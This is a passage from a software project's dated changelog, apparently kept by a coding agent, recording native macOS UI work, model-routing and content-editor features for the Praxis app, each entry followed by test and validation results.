## 2026-09-23 — Inline native skill list

Replaced the Skills/commands popup chip with an automatically shown, scrollable
native list above the composer. Rows display command names and descriptions,
highlight the active keyboard choice, and are clickable without leaving focus
away from the editor. The list follows composer geometry, caps at 240 points,
and hides with the composer or when matches close. Existing React filtering,
Arrow/Enter/Tab handling and completion remain authoritative.

Native build/integration passed, including visible-list and slash-completion
checks plus existing draft, modal, editing and isolation checks. All four
typechecks, docs-links and whitespace checks passed; no Electron tests ran.

## 2026-09-23 — Native composer spacing and compact controls

Removed the chat pane’s separate background/token override so it shares the shell
surface. The composer’s excessive top space came from an always-reserved 22-point
chip row plus a forced 152-point form minimum. Empty chips now collapse and the
form minimum is 112 points; populated context/attachment/suggestion rows remain.
Send/Stop is 36 points with a larger symbol and a flexible spacer keeping it at
the right. Pickers measure selected labels rather than their longest menu option,
using Electron ComposerSelect’s ten-character compact rule; full labels remain
in menus/tooltips and controls can shrink on narrow layouts.

Native integration passed twice, including final geometry assertions for the
empty input’s top inset and Send’s size/right inset, plus drafts, history,
attachments, permissions and editing flows. Build, all four typechecks, docs-links
and whitespace checks passed. Inspected the composer content capture; offscreen
glass compositing still has the documented limits. No Electron tests ran.

## 2026-09-23 — Circular glass Settings button

Replaced the sidebar’s labeled Settings control with an icon-only 36-point circle.
On macOS 26 it uses NSGlassEffectView with an 18-point radius around the native
gear button; older macOS uses a circular system bezel. The Settings tooltip,
accessibility label and existing action remain available.

Native compilation/build and all four typechecks passed, as did docs-links and
whitespace checks. Native integration again failed before UI initialization with
the existing WebKit unsupported-result startup error, so the final appearance and
click interaction were not verified in the running UI. No Electron tests ran.

## 2026-09-23 — Project sidebar and chat history toolbar

The native sidebar now lists projects only, selecting the active project rather
than its chat. Each row has a hover More menu with Project Memory and Close
Project; it also stays visible on the selected row, and right-click offers the
same actions. The outline uses standard column autosizing with no tree indentation. Chat rows remain in the transport snapshot for history and routing.

The chat header has a plain, non-actionable title on the left and History then
New Chat on the right. History lists the current project’s open and saved chats,
marks the active chat, and reuses the existing switch/review handlers. Removed
the old header options menu. Native integration verifies project-only row counts,
header configuration, and history-based chat switching with draft restoration,
plus existing native flows on the first run. The final build, all four typechecks,
docs-links and whitespace checks passed. Follow-up integration runs after row
sizing/selected-row visibility adjustments failed before UI initialization with
the known WebKit unsupported-result startup error; those final adjustments were
not verified end to end. No Electron tests ran. Offscreen captures retain the
existing glass/WebKit compositing limitations.

## 2026-09-23 — Projects button opens from its icon

Removed the generic toolbar action from the Projects NSMenuToolbarItem. AppKit
was treating it as a split button, sending an unhandled action from the icon and
opening the menu only from the chevron. It is now menu-only, like the Branch
control, so the entire button opens New Project/Open Project. Native integration
asserts the menu-only configuration and still exercises Open Project through its
menu entry. Native build/integration and all four typechecks passed; no Electron
tests ran.

## 2026-09-23 — Sidebar includes the traffic lights

Enabled full-size native window content and full-height sidebar layout so the
open sidebar surface extends behind the system window controls. The project list
uses the sidebar safe area; a detail wrapper keeps the WebKit canvas below the
toolbar, preserving preview/composer coordinates. Split resize notifications keep
the chat toolbar aligned when the full-height sidebar collapses or reopens.

Native build/integration passed, including sidebar/window-control containment,
content safe-area geometry, toolbar alignment, collapse/restore and existing
composer/editing flows. All four typechecks, docs-links and whitespace checks
passed. No Electron tests ran. Inspected the sidebar capture; full-window glass
and WebKit capture limitations still apply.

## 2026-09-23 — Column-aligned native toolbar

Grouped the AppKit toolbar by its content columns, following the Notes reference.
The Projects menu and sidebar toggle sit before the sidebar tracking separator;
the chat title, New Chat and options (Project Memory/Close Chat) occupy the chat
section; branch, navigation, device, code, expand and trailing primary Publish
remain in the preview section. Removed duplicate project/chat buttons above the
sidebar outline; Settings stays below it. Hiding chat compacts its toolbar group.

A renderer ResizeObserver mirrors the actual chat pane width; AppKit measures in
window coordinates to align the header’s separator with the web divider. Native
integration verifies alignment at 360, 480 and 440 points and after sidebar
collapse, plus existing navigation, draft, editing and isolation flows. Native
build/integration and all four typechecks passed; docs-links and whitespace checks
passed. No Electron tests ran. Inspected the native capture, whose offscreen
WebKit/glass compositing still limits visual verification.

## 2026-09-23 — Remove native chat's gray fill

Scoped the native chat pane to the existing theme content-background token,
replacing the inherited Electron shell gray. Rebound its local `--bg` token so
the status fade and scrollbar edges match the new surface in light and dark mode.
The Liquid Glass composer and Electron appearance retain their existing styling.
Native integration/build and all four typechecks passed. Updated AGENTS and TESTING
per the user's preference: native work uses native checks and relevant unit tests,
without running Electron suites, including when native changes touch shared UI.
No Electron tests ran for this change.

## 2026-09-23 — Native navigation and automatic scrollbars

Moved Home, the editable preview address and desktop/mobile switching into the
AppKit toolbar. The address mirrors actual navigation, preserves edits while
focused, submits on Enter and reverts on Escape. Navigation stays within the
project origin; Home uses the project's base URL. Simulator device switching is
disabled. The running web preview header is removed only in native mode; loading
and error status remains visible. Publish is the trailing accent-colored native
button, retaining its separate PR/merge menu without taking the Return shortcut.

The sidebar and composer previously enabled scrollers without auto-hide. Both now
use auto-hiding overlay scrollers, and the empty text document no longer retains
an initial height larger than its viewport. Native-mode chat also drops its fixed
scrollbar gutter and uses a thinner thumb. The project page's scrollbars are not
modified.

Validation: native integration passed address/query/hash navigation, Home, device
switching, toolbar order/primary styling configuration, hidden duplicate header,
automatic scrollers and existing editing/composer/isolation checks. All four
typechecks passed. Inspected the native toolbar capture; inactive/offscreen glass
compositing retains the documented visual limitations. The final native run passed
in isolation after an intermittent WebKit startup evaluation failure during the
concurrent run. Deterministic regressions: 146 PASS, with native checks separate
and external agent-send tests excluded. Report:
`test/artifacts/runs/run-bbHdPw/summary.json`. Docs-links and whitespace checks pass.

## 2026-09-23 — Preview-focused native toolbar

Moved New Project, Open Project and New Chat into the top of the native sidebar,
with Settings at the bottom. The toolbar now has a leading sidebar toggle/tracking
separator, current branch menu, Publish/Create PR (or Connect to GitHub), code and
expand/restore controls. Removed their duplicate web preview-header controls only
in the native build. URL and device controls remain local to the preview.

Extended the typed shell bridge to call existing App handlers for branch changes,
Git Updates, publishing and code editing. Native branch creation uses a sheet;
publish mode is a native dropdown. Disabled/busy labels mirror the shared state.
Expand hides both chat and native sidebar, then restores the sidebar's previous
collapse state. Replaced the old persisted toolbar configuration so existing native
profiles receive the new arrangement.

Validation: native build and integration passed sidebar project opening, toolbar
order, code toggling, expand/restore, publish-mode selection and existing composer,
editing and preview-isolation checks. Inspected sidebar and toolbar captures;
offscreen WebKit/vibrancy compositing still has the previously documented limits.
All four typechecks, docs-links and whitespace checks passed. No publish operation
was performed. Deterministic regressions: 145 PASS, one startup crossfade failure,
which passed on isolated rerun. Native tests ran separately; external agent sends
were excluded. Reports: `test/artifacts/runs/run-W73Vyn/summary.json` and
`test/artifacts/runs/run-k7do9M/summary.json`.

## 2026-09-23 — Native Liquid Glass composer

Added an AppKit multiline chat composer using Apple's `NSGlassEffectView` on
macOS 26+, with a visual-effect fallback on older systems. Standard native
controls handle attachments, provider/model/permission choices, context clearing,
slash-command choices and send/stop. PNG/TIFF clipboard images and local file
paths pass through the existing attachment handlers. Build now needs the macOS
26 SDK while retaining the macOS 13.3 deployment target.

The native-only DOM adapter mirrors geometry/state and dispatches into the shared
React composer, keeping its draft, queue, model confirmation and agent semantics.
Electron keeps its original composer. Native input revisions prevent delayed
snapshots from overwriting typing, and background synchronization uses timers
because animation frames can stop in occluded WebKit windows. Undo is enabled in
the native text field and cleared between chats.

Validation: native build and all four typecheck projects passed. Native typing,
per-chat draft restoration, file/image attachment add/remove, permission changes,
slash completion, modal visibility and host geometry checks passed. WebKit
reported unsupported evaluation result types during later startup checks; explicit
JSON result conversion in the private evaluation helper resolved that run, and
the full native integration check passed again. The authorized live Codex test submitted through the native send button,
streamed a response, edited the fixture and verified the result in WebKit.
Offscreen Liquid Glass/content captures are blank despite valid control geometry;
visual appearance, pointer interaction and IME still need an unlocked-desktop
check. Image thumbnails, richer slash suggestions and attachment error feedback
remain follow-up work.

Deterministic regressions: 145 PASS, one startup-intro animation timeout; that
test passed on an isolated rerun. Native checks ran separately and ten external
agent-send tests were excluded. Reports: `test/artifacts/runs/run-tnkZlZ/summary.json`
and `test/artifacts/runs/run-THWLnA/summary.json`. Docs-links and whitespace checks
passed.

## 2026-09-23 — System macOS sidebar and toolbar

Added an AppKit source-list outline for projects/live and previous chats, a system
split-view divider/sidebar toggle, and standard toolbar items for opening/creating
projects, new chats, reload, selection, chat visibility and settings. Context menus
reuse the existing project-memory and close actions. Chat, inspectors, settings,
code editing and detailed preview controls remain in WebKit. Electron retains its
React rail and window controls.

The native-only renderer hook subscribes to workspace state, sends changed compact
snapshots and routes native actions through the current App closures. Sidebar
collapse preserves detail-local preview coordinates. Added shared bridge types
and preserved undefined optional IPC arguments across JSON serialization; the new
multi-chat check exposed null defeating shared-handler default options.

Validation: all four typecheck projects and native build passed. Native checks
passed toolbar project opening, selection/chat toggles, sidebar collapse, real
chat-session switching, source editing/live reload, undo/redo, image delivery,
pop-out editors and preview isolation. Authorized Codex fixture editing also
passed through the new shell. Inspected native sidebar/toolbar and separate web
captures; offscreen vibrancy/WebKit compositing is limited, documented in NATIVE.
Pointer interaction and missing sidebar parity (rename/order/background agents)
remain manual/future work.

Deterministic regression run: 144 PASS, two animation failures (startup-intro
timing and rail-collapse icon morph), with native checks run separately and ten
agent-send tests excluded. Both failures passed on an isolated serial rerun.
Reports: `test/artifacts/runs/run-xsVFmE/summary.json` and
`test/artifacts/runs/run-Lo2sAf/summary.json`. Docs-links and whitespace checks pass.

## 2026-09-23 — Native Codex live edit verified

Added `PRAXIS_NATIVE_TEST_PROVIDER=codex` to the native live test. Corrected the
test setup to restart the actual backend session with the requested provider and
options; changing renderer store state alone leaves the opened session unchanged.

The user-authorized Codex run passed: actual composer submission, streamed tool
and reply events, fixture heading edited on disk to `NATIVE_AGENT_VERIFIED`, and
the same heading observed after WebKit preview reload. All deterministic native
checks also passed. Inspected the captured Codex chat and provider events in
`test/artifacts/native/`. Native typecheck, docs-links and whitespace checks passed.
Claude remains unverified because its SDK returned the missing-login response.

## 2026-09-23 — Authorized native live test: Claude login required

With explicit user approval, ran `bun run test:native-live`. The deterministic
native checks passed, and the actual composer submitted the fixture prompt through
the shared provider SDK. Claude returned “Not logged in · Please run /login” as
a text delta followed by done; no source edit occurred. Captured provider events
and inspected the chat screenshot under `test/artifacts/native/`.

Updated the test to recognize that exact login response as an authentication skip,
capture events/screenshots before assertions, and set live model/permission options
after project opening (which restores session settings). No successful native
model edit is claimed. Claude sign-in is required before rerunning this test.
Validation: rerun passed the deterministic checks and reported live authentication
SKIP correctly; native typecheck, docs-links and whitespace checks passed.

## 2026-09-23 — Shared Praxis app on Bun and system WebKit

`bun run dev:native` now builds and launches the real Praxis UI and shared
application services on Bun, with a Swift/AppKit/WKWebView host. The native build
aliases the Electron primitives used by those services to a private adapter;
the existing Electron entrypoint, renderer and business logic remain shared and
unchanged. Added `build:native`, `typecheck:native`, native desktop tests and
`docs/NATIVE.md`. Native state has a separate profile and process lock.

The host supplies windows, menus, folder dialogs, screenshots, media delivery,
pop-out code editors and Keychain-backed encryption. Preview instrumentation runs
in an isolated content world with an event allowlist; privileged IPC is denied.
The app asset server is loopback-only and exposes no backend command API.
Linux, distribution, profile migration, app-shell HMR and updater parity remain
future work. Keychain credential round trips and manual pointer interaction have
not been verified.

Validation: native build and all four typecheck projects passed. Real WKWebView
integration passed project opening, managed static server startup, selection,
computed styles, source edits/live reload, undo/redo, image delivery, pop-out
editor loading, agent workspace access and preview isolation. Inspected both
main and preview captures under `test/artifacts/native/`. A transient startup
timeout occurred on one run; subsequent runs reached the checks. The media test
now uses an image element like the product instead of fetching the custom scheme.
Regression run: 146 PASS, 1 existing startup-intro crossfade assertion FAIL;
report `test/artifacts/runs/run-xeTG1A/summary.json`. Ten tests containing agent
send/spawn paths were excluded, and the live tier was not run. Docs-links and
diff whitespace checks passed.

The native live-composer fixture test is implemented but not executed: automatic
approval review rejected sending fixture data to an authenticated external model
with automatic tool permissions. A real native provider edit remains unverified
pending explicit approval; no alternate path was used to make that call.

## 2026-09-23 — Native prototype development command

Added `bun run dev:native` and included the standalone Bun/AppKit/WebKit prototype
under `experimental/native-runtime/`, so the command does not depend on a sibling
checkout. The launcher forwards arguments, rejects unsupported platforms, and
identifies itself as a prototype. `bun run dev` remains the complete Electron app;
the shared Praxis UI/backend integration is still pending.

Validation: all three typecheck projects passed. `bun run dev:native --test`
passed real WebKit load, isolated source selection, reload reinjection and PNG
capture; inspected the captured preview. Full regression suite: 154 PASS,
1 existing startup-intro crossfade assertion FAIL, 1 spawn-comment live SKIP.
Report: `test/artifacts/runs/run-E55Dkh/summary.json`.

## 2026-09-22 — Dedicated models for preview comments

Preview comment agents now use the latest Sonnet alias on Claude subscriptions
and gpt-5.6-sol on Codex subscriptions. Gateway/custom connections retain their
exact selected model and connection, regardless of harness. A shared pure policy
is applied in main before queueing and in renderer dispatch/child model metadata.
The parent chat settings, draft and transcript remain unchanged. Visual-edit
agents continue to inherit the parent model. Updated docs/PROVIDERS.md.

Confirmed Sol against the bundled Codex runtime's model catalog, and Sonnet's
rolling alias against https://code.claude.com/docs/en/model-config.
Validation: typecheck/build passed; unit policy cases cover default/explicit
providers, connection precedence, visual edits and non-mutation. Electron tests
exercise actual comment events through renderer dispatch, captured IPC options,
queued model labels and preserved parent state; inspected the UI capture. A real
Sonnet comment spawn edited and auto-landed successfully. Full verify: 167 PASS,
1 known agent-multi already-running failure, 3 SKIP (Gateway test credential,
external Next fixture, Xcode). All executed live-tier checks passed.

## 2026-09-22 — Remove annotations from the selection toolbar

Removed the pin-note action from the preview's selection toolbar. The remaining
order is Comment, Edit text, Props, 3D, Code and Delete. Existing saved notes and
the annotation shortcut remain available; this change removes the toolbar entry.
Updated the selection test's expected buttons and nearby documentation comments.

Validation: typecheck and build passed. Selection and comment-mode Electron tests
passed; inspected the native preview capture to confirm the shorter toolbar.
Full suite: 152 PASS / 2 FAIL (known agent-multi already-running failure and a
spawn-comment branch-cleanup assertion). The isolated spawn-comment rerun passed.

## 2026-09-22 — Restore each chat's composer model

Existing chat settings no longer merge with the last-used/fixed model preference.
That merge supplied a different chat's optional modelId and connectionId when a
restored main snapshot or persisted chat omitted them, making the composer show
Gateway while the existing session still ran its original model. Existing chats
now use their saved settings over neutral defaults; missing chats still inherit
the preferred model.

Validation: new unit coverage fails against the original implementation and passes
for Codex, Claude and default-model snapshots with the fix. Extended the Electron
chat-render test with last-used Gateway preferences and sidebar round trips;
inspected its screenshot showing the older chat's Claude/Sonnet composer.
Typecheck/build passed. Full suite: 153 PASS / 1 existing agent-multi failure
(“This chat is already running”). The initial sandboxed run could not launch
Electron or bind local ports; these results are from the permitted rerun.

## 2026-09-21 — Compact preview address input

Capped the editable preview path at 200px with a Tailwind max-width utility,
retaining flex shrinking in narrow toolbars. The focused field no longer spans
the available toolbar space in wide windows.

Validation: typecheck and build passed. An isolated Electron probe measured a
200px focused input in an 1800px window; inspected its screenshot. Full suite:
152 PASS / 2 known failures (startup-intro native crossfade and agent-multi
already-running). The initial sandboxed run could not bind ports or launch
Electron; the reported full result is the rerun with those permissions enabled.

## 2026-09-21 — Surface-controls skill and no-key fallback

Bundled surface-controls routes natural requests for content, component, style and
animation controls through native Praxis tools. Operating rules v19 require this
workflow, and portable skill menus expose /surface-controls. It distinguishes app
end-user UI requests, JSON content editors, existing inspectors and persistent
animation controls, with source wiring, landing and verification instructions.

Control registration accepts engine:auto to prefer Jev. Both auto and explicit
jev fall back to the chat model's prepared candidates only when the Gateway key
is absent. Registration still validates recipes, content and source anchors;
tool results report engine:agent plus the missing-key reason. Ambiguous/decryption
errors, failed requests, cancellation and invalid decisions remain errors. Explicit
agent and the legacy omitted-engine path skip Jev. Project-UI composition keeps
its separate explicit-engine behavior.

Validation: skill validator, typecheck, build, focused fallback/discovery/rules tests
passed. Full suite: 153 PASS / 1 existing agent-multi failure. Live no-key test:
PASS with a plain “Surface controls for the homepage headline” request, no saved
connection and both Gateway env keys removed. The agent invoked surface-controls,
reported the fallback, registered the editor, and the harness confirmed source Save
updates the real preview. Inspected the resulting editor screenshot. The provider
turn could not use its preview-state observer under its existing approval policy;
the independent Electron harness completed that verification after landing.

## 2026-09-21 — Saved Gateway credentials and missing content recovery

Content/animation control selection and project-component composition now reuse
Settings' encrypted Gateway key in main. The selected Gateway connection wins;
otherwise the sole saved Gateway is used. Multiple connections require selection,
custom endpoint keys are excluded, and explicit JEV_AI_GATEWAY_API_KEY overrides
remain supported. Both Claude and Codex tool paths pass their connection identity.

The supplied log repeatedly read writing-order.json while it was absent from the
live checkout. Missing bound files now return null from content-controls:get; editors
retry for a bounded interval and retry again on this project's landing events.
Parked/abandoned bindings show reload/removal guidance, without endless rejected
IPC. Loaded drafts are retained. Saves still require valid, current source.
Text editing now falls back to chat for unsupported formats and Babel SyntaxError,
matching the earlier inspection fix without rewriting malformed source.

Validation: typecheck and build passed. Full suite: 153 PASS / 1 FAIL, the existing
agent-multi “This chat is already running” failure. Focused Electron checks cover
missing-file timeout, landing recovery, source saves, browser commands and safe
MDX/malformed JSX text fallback. Unit checks cover Gateway connection selection,
origin confinement, unavailable keys, and worktree-to-live content availability.
Inspected the editor and separate native-preview captures. Targeted live verify:
3 PASS (content controls, animation controls, project UI composition), using an
OS-encrypted fixture connection with both Gateway env fallbacks removed from
Electron. Real Jev requests succeeded; the content test creates its JSON in a Git
worktree, lands it, surfaces the editor and saves to source.

## 2026-09-21 — Property inspection console errors

The supplied console log repeatedly rejected props:inspect with Babel syntax
errors. Inspection now skips non-JavaScript/TypeScript sources (such as stamped
MDX/HTML) and returns unavailable inspection for unrecoverable syntax errors in
JSX/TSX, including incomplete edits. Other unexpected errors still propagate.
The log did not identify the source filenames, so the exact offending files
remain unknown. Source viewing and Svelte dispatch retain their existing paths.

Validation: typecheck and build passed. Real Electron IPC regression covers
MDX, HTML, malformed JSX/TSX, and successful inspection after repairing the same
file; existing prop editing and style editing passed. Full suite: 153 PASS /
1 FAIL, the previously recorded agent-multi “This chat is already running” error.
Inspected the test's main-window screenshot; the separate inspector panel is
verified by its existing DOM assertions rather than that capture.

## 2026-09-21 — Content editors and Jev control decisions

Vendored the local content-controls 0.1 build and exposed its catalog/recipe flow
to Claude and Codex/custom endpoints. Chat binds page content to JSON; persistent
preview-area editors provide text/textarea, number, toggle/select and collection
controls with drafts, Undo/Reset and Save to source. Editors share the native
preview inset with animation panels, lazy-load their runtime, follow both themes,
and work through root-scoped browser commands. No target editor dependency is
needed. Registration reads the worktree and persists in the live sidecar.

Saves use the repository writer queue and edit history, preserve unknown document
and existing collection-item fields, validate recipes/values and real paths, and
reject stale content or recipe revisions without losing drafts. Corrupt stores
are not overwritten. JSON bindings and current limits are in CONTENT_CONTROLS.md.

Optional Jev chooses membership/order from prepared content sections or validated
animation/component parameters. It uses the existing main-process Gateway setup,
with two evaluations, a 25-second deadline and cancellation; failures register no
fallback. Verified the reference's catalog/decision approach in the browser.

Validation: typecheck, build, scoped MCP transport, unit checks and targeted lint
passed. Real Codex content registration made one successful Jev evaluation, then
saved through the editor. A separate real Jev animation turn passed parameter
editing, Replay, selection independence, collapse/reopen and source Undo. Browser
RPC tests cover root isolation, saves, preserved fields and stale revisions.
Light/dark content UI and native preview/animation screenshots were inspected;
16px regular editor text passes APCA in both themes (Lc 106 / 96).

Full regression initially finished 150 PASS / 4 FAIL. Fixed this change's MCP
entry-point startup issue; its real transport passed. Chat-hide launch timeout and
chat-render slash-selection assertions passed isolated retries. The pre-existing
agent-multi already-running failure remains. Final content UI passed after adding
a bounded retry for a transient native capture UnknownVizError (editing assertions
had already passed). Focused verify finished 12 PASS / 1 capture failure; that
content UI retry passed. All five live checks passed: content-controls with Jev,
animation controls with Jev, Claude controls, Codex controls and tool invocation.
Final typecheck and docs-link checks passed.

## 2026-09-21 — History as a chat-list row

Pulled origin/candidate and preserved both task-log entries when resolving the
merge conflict. History now lives inside the same list as the live chats and
uses their shared typography, padding and status-icon slot, with the normal 1px
row gap instead of a separate heading's top padding. Kept the muted gray for
both label and count and removed the obsolete section-heading CSS.

Validation: typecheck passed. Full suite initially finished 149 pass / 3 fail;
the two sidebar failures were outdated selectors after nesting History in the
chat list. Scoped live-row and Show-more selectors; overflow and reorder passed
on rerun. The remaining failure is the previously recorded agent-multi
already-running error. The status/geometry probe passed: matching 12px/400 fonts,
18px line height, 28px rows and a 1px gap in the same list. Inspected the final
light screenshot (native vibrancy disabled in the probe for readable capture).
Retained muted colors
measure APCA Lc 50 (light) / 41 (dark), below guidance for 12px regular text;
kept the requested lighter gray rather than changing the existing palette.

## 2026-09-21 — Subagent cat entrance

Subagent cats now play the existing six-frame appear sequence once on mount
before running or idling. The first render uses the empty entrance frame, and
status changes do not restart the sequence. Reduced motion skips the entrance;
unmounting cancels its timer. Quoted SVG data URLs in the CSS mask also fix the
solid-square rendering exposed by inspecting the entrance screenshot.

Validation: typecheck and targeted animation tests passed, including all six
entrance frames before the first run frame, valid SVG masks and reduced motion.
Entrance/run screenshots were inspected. Full regression: 150 pass / 2 fail;
project-ui-settings passed on isolated retry, leaving the previously documented
agent-multi already-running error. The final animation test passed again after
the mask fix. Targeted lint passed for CatLoader, animation assets and the test;
SubagentCats retains its pre-existing formatting/ARIA lint findings.

## 2026-09-21 — Actual Next portfolio source access

Diagnosed the running sibling `lkmv.ch` checkout without replacing its existing
work. Praxis was running this repository's development app; the portfolio used
Next 16.3.5 Turbopack through `bun run content:generate && next dev`, owned by
Praxis. Its migrated Next config had no wrapper and its sidecar had only old
React/Svelte helpers. The live portfolio contained zero source stamps, so the
preview correctly hid Code before any source-read IPC occurred.

Used the running app's scaffold API, wrapped the final MDX config with the existing
Next adapter, enabled the MDX remark helper only in the development phase, and
made Babel 7 a direct development dependency in the portfolio. Restarted through
Praxis's setup flow. All four installed helpers matched current source exactly.
No Praxis implementation change was needed. Production build output has no stamps.

Actual-app checks use trusted preview input and the real Code toolbar relay:
home/portfolio Server Component headings, nested IntentLink and ThemeSwitcher
Client Components, navigation and refresh all open the matching on-disk file and
highlight its authored line. Native preview and drawer screenshots were inspected.
Evidence and the repeatable probe are in ignored `test/artifacts/portfolio-debug/`.
Portfolio check, lint, 52 tests and production build passed. Restored missing
Praxis dependencies with the frozen lockfile; typecheck then passed. Full suite:
150 PASS / 1 FAIL / 1 SKIP. The existing test-runner test fails under this
machine's Bun 1.2.2 on missing-command spawn semantics, and passes under Node.
The live portion of spawn-comment skipped after no provider edit landed.
Selection, 3D, Code peek/drawer and setup checks passed. Also verified the actual
portfolio's 3D Code action and an MDX heading at its authored line. MDX selection
exposes a separate existing props-inspection parser error; Code still works.

## 2026-09-18 — Actual Jev UI composition

Added a persisted composition-engine selector under the existing opt-in toggle.
Each submitted/queued message captures the engine. Claude/Codex prepares concrete
project-component candidates; Jev selects membership and layout through the pinned
json-render 0.21.0 experimental composer. Finished trees pass the existing strict
TSX exporter and ordinary editing/landing flow. Jev failures do not silently fall
back. Requests are bounded to two evaluations, 24 candidates and 25 seconds;
interrupt and session teardown cancel composition and close the tool gate.

The Gateway credential stays in the main-process environment; the testing key is
stored only in an ignored owner-only local file. Setup and explicit Bun environment
forwarding are documented in PROJECT_UI.md. No key is embedded in code or renderer
state. The default remains current-chat-model generation, with the whole feature off.

Live evidence: direct Card/Text composition finished in one evaluation (641 ms,
615 input tokens). A second test correctly omitted irrelevant content and reordered
candidates in two evaluations (624 ms, 1,502 tokens). A real Codex/Electron turn
made a successful Jev network call, integrated returned TSX and rendered the native
preview; its screenshot was inspected. Offline tests exercise the actual composer,
validation, two-step ordering, unavailable results, cancellation and preferences.
Settings persistence and light/dark screenshots passed inspection; typecheck and
targeted lint passed. Full verification finished 161 PASS / 2 FAIL / 3 SKIP:
startup-intro failed its preview assertion (isolated retry timed out on the startup
screen), and agent-multi hit its recorded already-running error. The optional Next
fixture and Xcode simulator skipped; the suite's Jev test skipped without inherited
credentials, while its separate explicitly credential-enabled run passed as above.
All other live tests passed, including ordinary composition and tool-invocation.
The final build and post-change cancellation/ordering tests passed.

## 2026-09-18 — Opt-in project component composition

Added Settings → Use project components, off by default and persisted on the
current device. Each submitted message captures the setting, including queued
messages; turning it off keeps generated files and returns later messages to
ordinary editing. Desktop and browser sends carry the same typed turn option.

Claude and Codex now expose chat-gated, read-only catalog/export tools. Bounded
static React discovery extracts exports, literal prop schemas, children support,
and stylesheet tokens without executing project source or Babel configuration.
json-render validates the catalog/spec; a strict exporter rejects broken trees,
unknown props/variants and unsafe output paths, and returns ordinary TSX importing
real project components. The agent applies it through existing edits/landing; no
json-render package is installed in the target repo. Imported/conditional types,
custom adapters and other frameworks remain follow-up work. See PROJECT_UI.md.

Validation: typecheck and targeted lint passed. Unit checks render exported TSX
with the real fixture components and cover invalid specs, session isolation and
opt-out. Real stdio/socket transport, Settings restart persistence, and live Codex
catalog → export → source → preview checks passed. Settings light/dark and native
preview screenshots were inspected; explanatory text was sized for readability.
Full verification: 159 passed, three failed, two skipped. The transport assertion
was corrected and passed on rerun; remaining failures are the previously recorded
agent-multi running-chat error and tool-invocation failing to call design tools
(the latter also failed its targeted rerun). Next's optional fixture and the iOS
simulator were skipped. The feature's own live generation checks passed.

## 2026-09-18 — Advisory Jev pilot harness

Added an opt-in, dependency-free TypeSafe HTTP pilot, pinned to jev-1.13.0, with
10 development and 20 holdout cases across five failure categories. Labels are
agent-authored: 28 cases are synthetic and two are sanitized observed errors.
The held-out set contains only one observed error, so it is a feasibility check,
not a production accuracy estimate. Requests exclude labels, rationales, ids,
and provenance; predictions cannot change test outcomes.

Reports retain dataset/rubric hashes, a fixed keyword baseline, per-class
confusion, accuracy/Brier/calibration metrics, probability-threshold coverage,
latency, token usage, and dated price estimates. Calls are sequential, bounded,
redirect-rejecting, and stop on the first error without automatic retries.
Keys are loaded from the environment or ignored, owner-only .env.local; headers,
raw provider responses/errors, and known credential values are excluded from
reports. No real credential is present in the implementation or committed files.

Validation: offline protocol/redaction/metrics checks and both split dry runs
passed. The live command correctly reported a missing credential; no Jev call
or measured accuracy is claimed. A 0600 ignored local credential slot is ready.
Typecheck passed; full regression finished 148/149 in 240.5s. The sole failure
is the already recorded agent-multi running-chat error. The UI status screenshot
was inspected. See docs/JEV_PILOT.md for execution and the limits of the dataset
and cost estimates.

## 2026-09-18 — Reconcile candidate before pushing

Merged origin/candidate without rewriting either history. Kept both task-log
sections, the remote native composer pickers, and local queue/preview fixes.
Adapted the two newer animation/code-reveal tests to native provider selects after
the remote removed the custom-menu helper.

Validation: typecheck passed. Full suite initially passed 146/148, exposing the
removed test-helper import and the known agent-multi running-chat failure.
Animation/composer UI checks passed after correcting the imports. The skills-menu
check passed in the full run, failed once on insertion timing, then passed on retry.

## 2026-09-18 — Preview address alignment

Centered the Home control and URL vertically instead of baseline-aligning the
button with text. Added an 8px gap after Home while keeping origin/path adjacent,
and prevented the Home button from shrinking. Moved the touched layout rule to
Tailwind utilities. Typecheck, preview navigation, and screenshot verification
passed. Full suite: 146 passed; agent-multi retained its known running-chat failure,
and the live spawn-comment check failed to observe comment-branch cleanup.

## 2026-09-18 — Queued messages above the composer

Queued follow-ups now sit in an inset, rounded card tucked behind the composer,
with a leading queue icon, single-line label, and accessible trash action. Removed
the visible count heading for the ordinary running state; paused queues retain
Resume and multiple rows remain scrollable. The composer is opaque in both themes
so the overlap does not leak the card border through dark mode.

Validation: typecheck, message-queue logic, and Electron chat-render passed;
light/dark screenshots inspected. Full suite: 147 passed; only the previously
recorded agent-multi “This chat is already running” failure remains.

## 2026-09-18 — Concurrent test execution and trustworthy reports

Replaced the synchronous test loop with bounded subprocess workers: up to four
unit tests and two explicitly audited store-only UI tests. Unreviewed UI tests
are exclusive barriers; live tests stay serial. Builds run once, including for
live-only invocations, and a failed build blocks dependent tests. Added exact
filters, serial mode, per-test timeouts, process-group cleanup, a checkout lock,
individual logs, and JSON reports with wall time. Legacy skip markers now report
SKIP separately; partially skipped files never count as fully passing coverage.

Focused checks cover concurrency limits, barriers, stable ordering, skip/failure
precedence, spawn errors, timeout escalation, stubborn descendant cleanup,
cancellation, profile cleanup, and checkout locking. Clean unit benchmarks passed
77/77 in both modes: 35.7s serial versus 11.5s with four workers (about 3.1x).
Typecheck and full unit/Electron regression ran in a disposable checkout to avoid
other tasks' shared fixtures/build output: 147/148 passed in 266.8s. The sole
failure is the previously recorded agent-multi “This chat is already running”
error. Concurrent remote-indicator/smoke checks passed; screenshots inspected.
Additional CLI checks passed for build-once behavior, live-only builds, dependent
blocking after build failure, argument validation, report counts, and lock release.

Documented the runner contract and an optional labeled-log Jev evaluation pilot
in docs/TESTING.md. No model calls or probabilistic CI gates are introduced.

## 2026-09-18 — Code access inside exploded view

The 3D workspace hides the normal selection toolbar, which also hid its Code
action. Added a Code button to the workspace header for source-backed layers.
It resolves the current live selection and uses the existing source drawer relay,
keeping exploded view open alongside the editor. Missing/stale selections cannot
open code. Documented the action and covered a real child-layer click through IPC.

Validation: typecheck and targeted 3D/code-drawer Electron checks passed; native
toolbar and renderer drawer screenshots inspected. Full regression: 147 passed;
only the previously recorded agent-multi failure remains ("This chat is already
running").

## 2026-09-18 — One composer action while queueing

A running chat now swaps its spinner/Stop button for Queue when the composer
contains text or attachments. Submitting or clearing the draft restores Stop in
the same position, keeping one primary action visible. The Electron chat-render
check covers replacement and restoration; both screenshots were inspected.

Validation: typecheck, build, and targeted chat-render passed (also within the
full suite). Full regression was stopped after stalling in prop-edit-svelte;
native-animation-controls also failed accessing the native preview.

## 2026-09-18 — Automatic text conflict reconciliation

Successful interactive turns now three-way merge drift in existing regular text
files inside their private worktree. Independent edits land quietly. Actual text
overlaps trigger one reconciliation continuation in the originating provider/chat,
